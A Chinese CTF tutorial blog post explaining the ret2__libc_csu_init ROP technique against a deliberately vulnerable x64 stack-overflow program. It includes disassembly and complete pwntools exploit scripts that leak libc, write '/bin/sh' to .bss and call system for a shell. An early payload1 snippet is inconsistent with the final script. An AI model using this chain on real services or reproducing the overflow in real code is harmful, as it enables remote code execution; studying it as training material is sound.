---
title: ret2__libc_csu_init攻击技术示例-使用通用gadget
tags: [CTF, pwn, rop]
layout: post
categories: tutorials
---

> 本文参照蒸米的《一步一步学ROP之linux_x64篇》中的通用gadgets节

大部分程序在编译时都会加入一些通用函数进行初始化，而虽然程序源码不同，但初始化过程基本相同，利用这点，我们就可以使用其中的通用gadget劫持控制流

## ret2__libc_csu_init示例代码

``` c
#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function() {
	char buf[128];
	read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
	write(STDOUT_FILENO, "Hello, World\n", 13);
	vulnerable_function();
}
```

本节示例的漏洞程序可以在此处下载： [ret2__libc_csu_init](http://od7mpc53s.bkt.clouddn.com/ret2__libc_csu_init)

## 漏洞分析

程序中没有`system()`也没有字符串`/bin/sh`，那么我们就需要尝试通过泄露libc地址，从而计算处`system()`地址，再将字符串`"/bin/sh"`写入`.bss`段中，最后模拟调用`system("/bin/sh")`

程序中有`write()`函数，因此可以通过该函数输出`write.got`的地址，既然有能泄露内存信息的函数了，那么现在的问题就在于如何传递参数给`write()`

本次程序使用的是x64文件，x64下前6个参数会依次由`rdi rsi rdx rcx r8 r9`传递，而超过6个参数时，则会和x86一样，多余的参数从右至左压入栈中

当使用`ROPgadget`没有搜索到符合条件的gadgets时，我们就可以考虑使用`__libc_csu_init()`中的通用gadgets

``` asm
00000000004005c0 <__libc_csu_init>:
  4005c0:	41 57                	push   %r15
  4005c2:	41 56                	push   %r14
  4005c4:	41 89 ff             	mov    %edi,%r15d
  4005c7:	41 55                	push   %r13
  4005c9:	41 54                	push   %r12
  4005cb:	4c 8d 25 3e 08 20 00 	lea    0x20083e(%rip),%r12        # 600e10 <__frame_dummy_init_array_entry>
  4005d2:	55                   	push   %rbp
  4005d3:	48 8d 2d 3e 08 20 00 	lea    0x20083e(%rip),%rbp        # 600e18 <__init_array_end>
  4005da:	53                   	push   %rbx
  4005db:	49 89 f6             	mov    %rsi,%r14
  4005de:	49 89 d5             	mov    %rdx,%r13
  4005e1:	4c 29 e5             	sub    %r12,%rbp
  4005e4:	48 83 ec 08          	sub    $0x8,%rsp
  4005e8:	48 c1 fd 03          	sar    $0x3,%rbp
  4005ec:	e8 0f fe ff ff       	callq  400400 <_init>
  4005f1:	48 85 ed             	test   %rbp,%rbp
  4005f4:	74 20                	je     400616 <__libc_csu_init+0x56>
  4005f6:	31 db                	xor    %ebx,%ebx
  4005f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4005ff:	00
  400600:	4c 89 ea             	mov    %r13,%rdx
  400603:	4c 89 f6             	mov    %r14,%rsi
  400606:	44 89 ff             	mov    %r15d,%edi
  400609:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  40060d:	48 83 c3 01          	add    $0x1,%rbx
  400611:	48 39 eb             	cmp    %rbp,%rbx
  400614:	75 ea                	jne    400600 <__libc_csu_init+0x40>
  400616:	48 83 c4 08          	add    $0x8,%rsp
  40061a:	5b                   	pop    %rbx
  40061b:	5d                   	pop    %rbp
  40061c:	41 5c                	pop    %r12
  40061e:	41 5d                	pop    %r13
  400620:	41 5e                	pop    %r14
  400622:	41 5f                	pop    %r15
  400624:	c3                   	retq
  400625:	90                   	nop
  400626:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40062d:	00 00 00
```

我们来关注一下`0x40061a`处的汇编代码

``` asm
40061a:	5b                   	pop    %rbx
40061b:	5d                   	pop    %rbp
40061c:	41 5c                	pop    %r12
40061e:	41 5d                	pop    %r13
400620:	41 5e                	pop    %r14
400622:	41 5f                	pop    %r15
400624:	c3                   	retq
```

我们可以通过这片代码控制`rbx rbp r12 r13 r14 r15`寄存器的值，

``` asm
400600:	4c 89 ea             	mov    %r13,%rdx
400603:	4c 89 f6             	mov    %r14,%rsi
400606:	44 89 ff             	mov    %r15d,%edi
400609:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
40060d:	48 83 c3 01          	add    $0x1,%rbx
400611:	48 39 eb             	cmp    %rbp,%rbx
```
随后借由`0x400600`我们通过`r13 r14 r15`间接控制了`rdx rsi edi`的值。随后是`callq  *(%r12,%rbx,8)`也就是`call qword ptr [r12+rbx*8]`，我们设置`rbx=0`，再构造`r12`的值，那么就可以调用任意地址的函数。执行完`call qword ptr [r12+rbx*8]`后，`rbx+=1`并将`rbx`与`rbp`进行比较，这里我们设置`rbp`的值为1，那么在比较的时候恒成立，那么程序接下来继续执行，就可以成功retrun到我们想要的地址

首先我们先来构造payload1，利用`write()`函数输出write在内存的地址

``` python
from pwn import *

elf = process('ret2__libc_csu_init')
libc = process('libc.so.6')

got_write = elf.got['write']
got_read = elf.got['read']
main = elf.symbols['main']
bss_addr = elf.bss()

csu_init_front = 0x400600
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40061a

#write(rdi=1, rsi=write.got, rdx=4)
#rbx=0
#rbp=1
#r12=write.got
#r13=rdx=8
#r14=rsi=write.got
#r15=edi=1
payload1 = 'A' * 136
payload1 += p64(pop_rbx_rbp_r12_r13_r14_r15_ret) + p64(0) + p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(8) + p64(got_write) + p64(1)
payload1 += p64(csu_init_front)
payload1 += 'A' * 56
payload1 += p64(main)
```

这样我们就已经使用__libc_csu_init中的通用gadgets泄露出了write函数的内存地址了

接下来我们需要解决的，就是构造payload2，利用`read()`函数将`system()`的地址以及`/bin/sh`写入到`.bss`段中

``` python
#read(rdi=0, rsi=bss_addr, rdx=16)
#rbx=0
#rbp=1
#r12=read.got
#r13=rdx=16
#r14=rsi=bss_addr
#r15=edi=0
payload2 = 'A' * 136
payload2 += p64(pop_rbx_rbp_r12_r13_r14_r15_ret) + p64(0) + p64(1) + p64(got_read) + p64(16) + p64(bss_addr) + p64(0)
payload2 += p64(csu_init_front)
payload2 += 'A' * 56
payload2 += p64(main)
```

那么最后，就是构造payload3，执行`system(rdi=bss_addr+8="/bin/sh")`

``` python
#system(rdi=bss_addr+8="/bin/sh")
#rbx=0
#rbp=1
#r12=bss_addr
#r13=rdx=0
#r14=rsi=0
#r15=edi=bss_addr+8
payload3 = 'A' * 136
payload3 += p64(pop_rbx_rbp_r12_r13_r14_r15_ret) + p64(0) + p64(1) + p64(bss_addr) + p64(0) + p64(0) + p64(bss_addr+8)
payload3 += p64(csu_init_front)
payload3 += 'A' * 56
payload3 += p64(main)
```

OK，我们的所有payload在此就都已经构造完毕了。

## 攻击代码

``` python
from pwn import *

elf = ELF('./ret2__libc_csu_init')
libc = ELF('./libc.so.6')

got_write = elf.got['write']
got_read = elf.got['read']
start = elf.symbols['_start']
bss_addr = elf.bss()

libc_write = libc.symbols['write']
libc_system = libc.symbols['system']

csu_init_front = 0x0000000000400600
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x000000000040061A

#write(rdi=1, rsi=write.got, rdx=4)
#rbx=0
#rbp=1
#r12=write.got
#r13=rdx=8
#r14=rsi=write.got
#r15=edi=1
payload1 = 'A' * 136
payload1 += p64(pop_rbx_rbp_r12_r13_r14_r15_ret) + p64(0) + p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(1)
payload1 += p64(csu_init_front)
payload1 += 'A' * 56
payload1 += p64(start)


#read(rdi=0, rsi=bss_addr, rdx=16)
#rbx=0
#rbp=1
#r12=read.got
#r13=rdx=16
#r14=rsi=bss_addr
#r15=edi=0
payload2 = 'A' * 136
payload2 += p64(pop_rbx_rbp_r12_r13_r14_r15_ret) + p64(0) + p64(1) + p64(got_read) + p64(16) + p64(bss_addr) + p64(0)
payload2 += p64(csu_init_front)
payload2 += 'A' * 56
payload2 += p64(start)



#system(rdi=bss_addr+8="/bin/sh")
#rbx=0
#rbp=1
#r12=bss_addr
#r13=rdx=0
#r14=rsi=0
#r15=edi=bss_addr+8
payload3 = 'A' * 136
payload3 += p64(pop_rbx_rbp_r12_r13_r14_r15_ret) + p64(0) + p64(1) + p64(bss_addr) + p64(0) + p64(0) + p64(bss_addr+8)
payload3 += p64(csu_init_front)
payload3 += 'A' * 56
payload3 += p64(start)

io = process('./ret2__libc_csu_init')

# payload 1
io.recvuntil('Hello, World\n')
io.send(payload1)
sleep(1)

# calculate some address
write_addr = u64(io.recv(8))
print "[+] write() address: " + hex(write_addr)
libc_base = write_addr - libc_write
print "[+] libc base address: " + hex(libc_base)
system_addr = libc_base + libc_system
print "[+] system() address: " + hex(system_addr)

# payload 2
io.recvuntil('Hello, World\n')
io.send(payload2)
sleep(1)
io.send(p64(system_addr) + '/bin/sh\x00')

# payload 3
io.recvuntil('Hello, World\n')
io.send(payload3)
io.interactive()

```
